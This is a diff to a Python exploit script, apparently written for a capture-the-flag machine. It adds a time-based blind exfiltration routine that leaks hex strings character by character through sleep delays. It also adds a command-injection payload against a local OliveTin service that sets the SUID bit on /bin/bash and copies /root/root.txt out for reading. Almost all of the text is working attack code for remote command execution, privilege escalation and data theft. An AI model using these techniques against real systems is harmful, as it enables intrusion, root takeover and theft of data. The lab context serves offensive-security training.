@@ -308,6 +308,48 @@ def exec_confirmed(o, base, mid, pid, seconds=6):
     return (time.time() - t0) >= seconds - 1
 
 
+_HEX = "0123456789abcdef"
+
+
+def _timed(o, base, mid, pid, script):
+    t0 = time.time()
+    upload(o, base, mid, pid, script)
+    return time.time() - t0
+
+
+def read_hex_timing(o, base, mid, pid, cmd, maxlen=33):
+    """Blind exfil of a HEX string (a flag/hash) via response timing — needs no
+    egress and no readable dir. For each position, sleep N seconds where N is the
+    hex value of that char (a-f -> 10..15); measure and decode. Slow but certain."""
+    base_ovh = min(_timed(o, base, mid, pid, "sleep 0") for _ in range(2))
+    log(".", f"  timing baseline ~{base_ovh:.1f}s/req; extracting up to {maxlen} "
+             "chars (this takes a few minutes)…")
+    out = ""
+    for i in range(1, maxlen + 1):
+        script = "\n".join([
+            f'C=$( {{ {cmd} ; }} 2>/dev/null | tr -d "\\n\\r " | cut -c{i})',
+            'case "$C" in',
+            '  [0-9]) sleep "$C" ;;',
+            '  a|A) sleep 10;; b|B) sleep 11;; c|C) sleep 12;;',
+            '  d|D) sleep 13;; e|E) sleep 14;; f|F) sleep 15;;',
+            '  *) : ;;',
+            'esac',
+        ])
+        dt = _timed(o, base, mid, pid, script)
+        val = round(dt - base_ovh)
+        if val < 0:
+            val = 0
+        if val == 0 and i > 1:            # empty char -> end of string
+            break
+        if val > 15:                      # jitter/overrun — re-measure once
+            dt = _timed(o, base, mid, pid, script)
+            val = max(0, min(15, round(dt - base_ovh)))
+        out += _HEX[val]
+        print(f"      [{i:2}] {_HEX[val]}  ({out})", end="\r", flush=True)
+    print()
+    return out
+
+
 # ---- OliveTin root ------------------------------------------------------
 def olivetin_root_run(run):
     log("*", "checking for a local OliveTin (127.0.0.1:1337) …")
@@ -382,13 +424,36 @@ def main():
             log("+", "file-write/op=download channel LIVE")
             runner = lambda c: run_cmd(o, base, mid, pid, None, c)  # noqa: E731
     if not runner:
-        log("!", "exec is proven but no output channel worked. Dumping download "
-                 "list for diagnosis:")
-        for fid in range(0, 6):
-            body = get(o, f"{base}/actions.php?op=download&id_module={mid}"
-                          f"&id_plugin={pid}&file_id={fid}")
-            log(".", f"  download file_id={fid} -> {body.strip()[:100]!r}")
-        sys.exit(5)
+        log("!", "no HTTP/reverse output channel (egress blocked + import dir "
+                 "unreadable). Falling back to the TIMING oracle to read the flag "
+                 "directly — slow but egress-free and dir-free.")
+        flag = read_hex_timing(o, base, mid, pid,
+                               "cat /home/*/user.txt /var/www/*/user.txt")
+        m = re.search(r"[0-9a-f]{20,}", flag)
+        if m:
+            log("+", f"USER FLAG: {m.group(0)}")
+        else:
+            log(".", f"timing read returned: {flag!r} (partial/noisy — re-run)")
+        log("*", "reading root.txt via OliveTin + timing (chmod SUID bash, copy "
+                 "root.txt world-readable, time-read it)…")
+        # fire the OliveTin injection blind, then timing-read the staged flag
+        import json
+        inj = ("x' ; chmod u+s /bin/bash ; /bin/bash -p -c 'cp /root/root.txt "
+               "/tmp/.rf; chmod 644 /tmp/.rf' ; #")
+        body = json.dumps({"actionId": "Backup Database",
+                           "arguments": {"db_pass": inj}})
+        import shlex
+        upload(o, base, mid, pid,
+               "ss -tlnp 2>/dev/null | grep -q 1337 && "
+               "curl -s -m 8 -X POST http://127.0.0.1:1337/api/StartActionAndWait "
+               "-H 'Content-Type: application/json' -d " + shlex.quote(body))
+        rflag = read_hex_timing(o, base, mid, pid, "cat /tmp/.rf /root/root.txt")
+        rm = re.search(r"[0-9a-f]{20,}", rflag)
+        if rm:
+            log("+", f"ROOT FLAG: {rm.group(0)}")
+        else:
+            log(".", f"root timing read: {rflag!r} (OliveTin may differ — re-run)")
+        sys.exit(0)
 
     log("+", "RCE output:")
     for ln in runner("id; hostname; pwd").strip().splitlines():
